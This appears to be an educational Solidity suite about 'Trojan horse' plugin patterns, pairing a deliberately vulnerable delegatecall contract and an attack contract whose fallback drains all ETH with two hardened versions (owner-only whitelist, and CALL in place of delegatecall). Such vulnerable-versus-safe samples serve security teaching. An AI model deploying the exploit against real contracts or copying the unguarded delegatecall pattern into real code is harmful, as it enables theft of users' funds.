// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

/// @title TrojanHorseSuite.sol
/// @notice On‑chain analogues of “Trojan Horse” patterns:
///   Types: PluginLoad, ProxyExec  
///   AttackTypes: UnauthorizedLoad, MaliciousExec  
///   DefenseTypes: OwnerAuth, PluginWhitelist, NoDelegate  

enum TrojanHorseType        { PluginLoad, ProxyExec }
enum TrojanHorseAttackType  { UnauthorizedLoad, MaliciousExec }
enum TrojanHorseDefenseType { OwnerAuth, PluginWhitelist, NoDelegate }

error TH__NotOwner();
error TH__PluginForbidden();

////////////////////////////////////////////////////////////////////////
// 1) VULNERABLE: dynamic plugin delegatecall
//
//   • Type: PluginLoad  
//   • Attack: UnauthorizedLoad & MaliciousExec  
//   • Defense: —  
////////////////////////////////////////////////////////////////////////
contract TrojanHorseVuln {
    address public plugin;

    /// ❌ anyone may point at any plugin
    function setPlugin(address p) external {
        plugin = p;
    }

    /// ❌ delegates calls to untrusted plugin
    function execute(bytes calldata data) external returns (bytes memory) {
        (bool ok, bytes memory res) = plugin.delegatecall(data);
        require(ok, "delegatecall failed");
        return res;
    }
}

////////////////////////////////////////////////////////////////////////
// 2) ATTACK STUB: load and run malicious plugin
//
//   • AttackType: UnauthorizedLoad, MaliciousExec  
////////////////////////////////////////////////////////////////////////
contract Attack_TrojanHorse {
    TrojanHorseVuln public target;
    constructor(TrojanHorseVuln _t) { target = _t; }

    function deployAndExploit() external {
        // attacker deploys itself as plugin and registers it
        target.setPlugin(address(this));
        // then invokes execute to run malicious code
        target.execute("");
    }

    /// malicious fallback invoked by delegatecall: steal all ETH
    fallback() external payable {
        payable(msg.sender).transfer(address(this).balance);
    }
}

////////////////////////////////////////////////////////////////////////
// 3) SAFE: owner‑only + plugin whitelist
//
//   • Defense: OwnerAuth + PluginWhitelist  
////////////////////////////////////////////////////////////////////////
contract TrojanHorseSafe {
    address public owner;
    address public plugin;
    mapping(address => bool) public whitelist;

    constructor() {
        owner = msg.sender;
    }

    /// only owner may manage whitelist
    function setWhitelist(address p, bool ok) external {
        if (msg.sender != owner) revert TH__NotOwner();
        whitelist[p] = ok;
    }

    /// only owner may set plugin, and plugin must be whitelisted
    function setPlugin(address p) external {
        if (msg.sender != owner) revert TH__NotOwner();
        if (!whitelist[p]) revert TH__PluginForbidden();
        plugin = p;
    }

    /// delegates only to approved plugin
    function execute(bytes calldata data) external returns (bytes memory) {
        (bool ok, bytes memory res) = plugin.delegatecall(data);
        require(ok, "delegatecall failed");
        return res;
    }
}

////////////////////////////////////////////////////////////////////////
// 4) SAFE WITHOUT DELEGATECALL
//
//   • Defense: NoDelegate – use CALL instead of DELEGATECALL  
////////////////////////////////////////////////////////////////////////
contract TrojanHorseSafeNoDelegate {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    /// forwards calls via CALL, isolating plugin’s state
    function execute(address target, bytes calldata data) external returns (bytes memory) {
        if (msg.sender != owner) revert TH__NotOwner();
        (bool ok, bytes memory res) = target.call(data);
        require(ok, "call failed");
        return res;
    }
}
